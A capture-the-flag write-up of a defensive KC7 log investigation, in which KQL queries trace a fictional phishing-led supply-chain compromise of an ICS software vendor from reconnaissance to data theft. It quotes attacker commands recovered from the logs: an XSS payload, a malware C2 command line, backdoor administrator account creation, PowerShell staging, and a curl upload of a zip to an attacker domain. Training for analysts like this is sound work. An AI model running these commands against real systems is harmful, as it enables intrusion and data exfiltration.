# SOLVI SYSTEMS: A TALE OF SUPPLY CHAINS AND ICS

A supply chain security investigation involving Industrial Control Systems (ICS) compromise through third-party vendor infrastructure.

![Difficulty](hxxps://img.shields[.]io/badge/Difficulty-Medium-yellow)
![Category](hxxps://img.shields[.]io/badge/Category-ICS%20Security-blue)
![Category](hxxps://img.shields[.]io/badge/Category-Supply%20Chain-purple)
![Type](hxxps://img.shields[.]io/badge/Type-CTF-orange)

---

## Challenge Details

| Attribute | Details |
|-----------|---------|
| **Challenge Name** | SOLVI SYSTEMS: A TALE OF SUPPLY CHAINS AND ICS |
| **Author** | David Brown |
| **Category** | ICS Security / Supply Chain Attack |
| **Difficulty** | Medium |
| **Platform** | KC7 |
| **Investigation Tool** | Azure Data Explorer (ADX) with KQL |
| **Target Organization** | Solvi Systems |
| **Industry Focus** | Power and utility companies in Southern Africa |

---

## Scenario

Solvi Systems provides DOCKS software used by power and utility companies across South Africa, Mozambique, Eswatini, Zimbabwe, and Namibia. This challenge investigates a sophisticated supply chain compromise affecting their Industrial Control Systems (ICS) infrastructure. The scenario involves analyzing how adversaries leveraged third-party vendor relationships and phishing campaigns to gain unauthorized access to critical industrial systems, culminating in data exfiltration of sensitive ICS documentation.

**Investigation Objectives:**
- Identify compromised supply chain components and attack infrastructure
- Trace lateral movement into ICS networks
- Determine impact on operational technology (OT) systems
- Document indicators of compromise (IOCs)
- Reconstruct the complete attack timeline

---

## Solution Walkthrough

### 1. Initial Reconnaissance

The investigation begins with understanding the organizational structure and baseline data.

```kql
# Enumerate employee database
Employees
| count
# Result: 500 employees

# Identify key personnel
Employees
| where role == "CTO"
# Result: Alexis Khoza (CTO)
```

**Key Findings:**
- Total organization size: 500 employees
- Critical personnel identified: Alexis Khoza (CTO)
- Multiple roles targeted, including DOCKS-related positions

### 2. Web Reconnaissance and Initial Attack Attempts

Adversaries conducted extensive reconnaissance using a consistent user agent string.

```kql
# Identify reconnaissance traffic
InboundNetworkEvents
| where user_agent contains "Opera"
| where timestamp between (datetime("2024-05-03") .. datetime("2024-05-05"))
| count
# Result: 64 total reconnaissance records
```

**Attack Timeline:**
- **First contact:** 2024-05-01T00:00:00Z
- **Main attack date:** 2024-05-03
- **XSS attempt timestamp:** 2024-05-03T14:48:08Z

**Reconnaissance Details:**
- 64 browsing records targeting solvisystems[.]com
- Specific interest in DOCKS ICS product
- 9 malicious web requests attempted (all unsuccessful - 404 responses)

```kql
# XSS attack attempt
InboundNetworkEvents
| where url contains "alert"
```

**Failed Attack Examples:**
- XSS payload: `https://www.solvisystems.com/feedback?message=</script><script>alert('xss')</script>`
- Status code: 404 (unsuccessful)
- JavaScript command attempted: `alert('xss')`

**Adversary Infrastructure:**

| IP Address | Activity |
|-----------|----------|
| 13.201[.]46[.]208 | XSS attempts, reconnaissance |
| 98.117[.]26[.]236 | C2 server, reconnaissance |
| 105.78[.]23[.]64 | Reconnaissance |
| 56.6[.]30[.]190 | Reconnaissance |

**User Agent:**
```
Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00
```

### 3. Supply Chain Analysis - Phishing Infrastructure

Investigation of the third-party vendor infrastructure revealed a coordinated phishing campaign.

```kql
# Identify malicious domains
PassiveDns
| where ip has_any ("98.117.26.236", "56.6.30.190", "105.78.23.64", "13.201.46.208")
| distinct domain
```

**Malicious Domains Identified:**
- eco-awareness-update[.]net
- energy-trends4u[.]net
- news-on-industry[.]com

**Domain Resolution:**
```kql
# Example: bit.ly resolution during investigation
PassiveDns
| where domain == "bit.ly"
| distinct ip
```

**Phishing Campaign Analysis:**

```kql
# Enumerate phishing emails
Email
| where link has_any ("eco-awareness-update.net", "energy-trends4u.net", "news-on-industry.com")
   or sender has_any ("eco-awareness-update.net", "energy-trends4u.net", "news-on-industry.com")
| count
# Result: 56 phishing emails
```

**Phishing Infrastructure:**
- Total emails sent: 56
- Distinct senders: 3
  - news[@]eco-awareness-updates[.]net
  - energy_industry_news[@]protonmail[.]com
  - electric_updates[@]gmail[.]com
- Distinct filenames in links: 3
- Email subject pattern: `[EXTERNAL] Business Opportunity: Two major energy companies merging`

**Targeted Roles:**
1. Sales Representative
2. Customer Support Specialist (27 employees targeted)
3. DOCKS ICS Security Lead
4. Project Manager for DOCKS ICS
5. DOCKS Customer Success Manager

### 4. Initial Compromise - Carla Wharton

The first successful compromise occurred through a targeted spear-phishing email.

```kql
# First phishing email
Email
| where link has_any ("eco-awareness-update.net", "energy-trends4u.net", "news-on-industry.com")
| take 1
```

**Victim Profile:**
- **Name:** Carla Wharton
- **Email:** carla_wharton[@]solvisystems[.]com
- **Hostname:** JUSP-LAPTOP
- **IP Address:** 10.10.0.164
- **Username:** cawharton

**Phishing Email Details:**
- **Timestamp:** 2024-05-01T15:51:41Z
- **Sender:** news[@]eco-awareness-updates[.]net
- **Reply-to:** electric_updates[@]gmail[.]com
- **Subject:** [EXTERNAL] Business Opportunity: Two major energy companies merging
- **Malicious Link:** `http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx`
- **Verdict:** CLEAN (bypassed email security)

**User Interaction:**
- Link clicked at: 2024-05-01T15:57:41Z (6 minutes after receipt)

```kql
# Confirm network access
OutboundNetworkEvents
| where url contains "news-on-industry.com"
| where src_ip contains "10.10.0.164"
```

### 5. Malware Deployment and Execution

```kql
# File creation events
FileCreationEvents
| where hostname == "JUSP-LAPTOP"
| where timestamp > datetime(2024-05-01T15:57:41Z)
| take 2
```

**Malware Deployment Timeline:**

| Time | File | Process | Hash |
|------|------|---------|------|
| 2024-05-01 15:58:29 | Energy_Industry_Trends_2024_4_Solvi.docx | firefox[.]exe | eb7126f65e8a0a8ae4c74b94cdd7ae89ebb6te61caa6578c3229208cc205dcd2 |
| 2024-05-01 15:59:25 | **ecobug[.]exe** | explorer[.]exe | **1c3ef0407d571403750c52f7abfa86c081fd7a021b52e2abe8a669f92413252** |

**Malware Details:**
- **Filename:** ecobug[.]exe
- **Path:** C:\ProgramData\ecobug[.]exe
- **SHA256:** 1c3ef0407d571403750c52f7abfa86c081fd7a021b52e2abe8a669f92413252
- **Distribution:** 39 Solvi Systems computers compromised

```kql
# Count infected systems
FileCreationEvents
| where filename contains "ecobug"
| count
# Result: 39 systems
```

### 6. Command and Control (C2) Communication

```kql
# Identify C2 commands
ProcessEvents
| where process_commandline contains "ecobug.exe"
```

**C2 Configuration:**
```bash
ecobug.exe --timeout 6000 --dest 98.117.26.236 --port 1337
```

**C2 Infrastructure:**
- **Server:** 98.117[.]26[.]236
- **Port:** 1337 (TCP)
- **Protocol:** Custom beacon

**Network Flow Analysis:**

```kql
# Analyze persistent connections
NetworkFlow
| where dest_ip contains "98.117.26.236" and src_ip contains "10.10.0.164"
| count
# Result: 24 connections from Carla's machine
```

**C2 Pattern:**
- Connection frequency: Daily at 17:38:25 UTC
- Total compromised hosts communicating with C2: 38 distinct source IPs
- Total connections: 470

### 7. Discovery and Enumeration

Post-exploitation discovery commands executed on compromised systems.

```kql
# Discovery commands on Carla's machine
ProcessEvents
| where process_commandline contains "net"
| where username contains "cawharton"
| where hostname == "JUSP-LAPTOP"
```

**Discovery Commands Timeline:**

| Timestamp | Command | Purpose |
|-----------|---------|---------|
| 2024-05-02 15:20:49 | `netstat -an` | Network enumeration |
| 2024-05-02 15:53:49 | `net view` | Network share discovery |
| 2024-05-02 17:28:49 | `net share` | Share enumeration |
| 2024-05-02 17:54:49 | `net use` | Last discovery command |

### 8. Persistence and Privilege Escalation

```kql
# Identify user creation
ProcessEvents
| where process_commandline contains "gu@rd!an"
| take 1
```

**Backdoor Account Creation:**
- **Username:** gu@rd!an
- **Password:** abc1toothree
- **Creation time:** 2024-05-02T16:25:20Z
- **Hostname:** MQQY-MACHINE
- **Created by:** makertzman

**Privilege Escalation:**
```cmd
net users /add gu@rd!an abc1toothree
net localgroup administrators gu@rd!an /add
```

**Persistence Mechanism:**
```kql
# Identify persistence command
ProcessEvents
| where process_commandline == "net use /PERSISTENT:YES"
| distinct hostname
```

**Systems with Persistence:**
1. SJ9V-MACHINE
2. UPLM-DESKTOP
3. JP4D-MACHINE

**First persistence timestamp:** 2024-05-27T16:23:10Z

### 9. Lateral Movement into ICS Infrastructure

The adversary pivoted to target DOCKS-related employees and systems.

**Key Target Identified:**
- **Name:** Alexei Petrov
- **Role:** DOCKS Customer Success Manager
- **Hostname:** SJ9V-MACHINE
- **IP Address:** 10.10.0.3
- **Email:** alexei_petrov[@]solvisystems[.]com
- **Username:** alpetrov

**Internal Reconnaissance:**

```kql
# Identify internal portal access
InboundNetworkEvents
| where url contains "process"
```

**Accessed Documentation:**
- **URL:** `https://devportal.solvisystems.com/development_lifecycle/internal_process.pdf`
- **Access timestamps:** 2024-05-27 10:46:48, 2024-05-29 10:13:18, 2024-05-29 14:45:08
- **Source IPs:** 56.6[.]30[.]190, 13.201[.]46[.]208

**Social Engineering Campaign:**

```kql
# Compromised account phishing
Email
| where sender contains "alex"
| where subject contains "document"
```

**Internal Phishing Details:**
- **Sender (compromised):** alexei_petrov[@]solvisystems[.]com
- **Subject:** "🤔 ¡Urgent Request: DOCKS System Documentation 🚨"
- **Targets:** Other DOCKS-related personnel
- **Purpose:** Locate sensitive DOCKS ICS documentation

**Recipients:**
- bernadette_callahan[@]solvisystems[.]com
- sibongile_sithole[@]solvisystems[.]com
- michael_potts[@]solvisystems[.]com
- marcia_biron[@]solvisystems[.]com
- lerato_naidoo[@]solvisystems[.]com

### 10. Data Collection and Staging

```kql
# File collection commands
ProcessEvents
| where hostname == "SJ9V-MACHINE"
| where process_commandline contains "copy"
```

**Collection Commands:**

```powershell
# Stage 1: Data Collection
Copy-Item -Path \\solvisystems.com\SharedDocs\SoftwareDevelopment\CycleDocuments\* -Destination C:\Users\alpetrov\CollectedData\Software_Cycle_Docs

# Stage 2: Compression
Compress-Archive -Path C:\Users\alpetrov\CollectedData\* -DestinationPath C:\DataExfil\CollectedData.zip
```

**Collection Timeline:**
- **Data copy:** 2024-05-27 17:09:58 and 17:11:58
- **Compression:** 2024-05-27 17:52:50
- **Archive name:** CollectedData[.]zip

**Network Paths Accessed:**
- `\\solvisystems.com\SharedDocs\SoftwareDevelopment\CycleDocuments\`

### 11. Data Exfiltration

```kql
# Exfiltration events
ProcessEvents
| where process_commandline contains "collecteddata.zip"
```

**Exfiltration Command:**
```bash
curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload
```

**Exfiltration Details:**

| Account | Hostname | Timestamp | File |
|---------|----------|-----------|------|
| alpetrov | SJ9V-MACHINE | 2024-05-28 11:23:14 | CollectedData[.]zip |
| jalee | UPLM-DESKTOP | 2024-05-29 10:22:59 | CollectedData[.]zip |
| tagreen | JP4D-MACHINE | 2024-05-29 16:20:39 | CollectedData[.]zip |

**Exfiltration Summary:**
- **Total compromised accounts used:** 3
- **Exfiltration destination:** api.eco-awareness-update[.]net/upload
- **Method:** HTTP POST via curl
- **Data type:** Sensitive DOCKS ICS software development documentation

### 12. Flag Capture

The investigation successfully reconstructed the complete attack chain from initial reconnaissance through data exfiltration, identifying all compromised systems and accounts.

**Key Evidence:**
```kql
# Complete attack reconstruction
let AttackTimeline = 
    InboundNetworkEvents
    | where user_agent contains "Opera"
    | union (Email | where link has_any ("eco-awareness-update.net", "energy-trends4u.net", "news-on-industry.com"))
    | union (FileCreationEvents | where filename == "ecobug.exe")
    | union (ProcessEvents | where process_commandline contains "gu@rd!an")
    | union (NetworkFlow | where dest_ip == "98.117.26.236")
    | project timestamp, EventType, Details;
```

---

## Tools Used

- **Azure Data Explorer (ADX)** - Primary investigation platform
- **K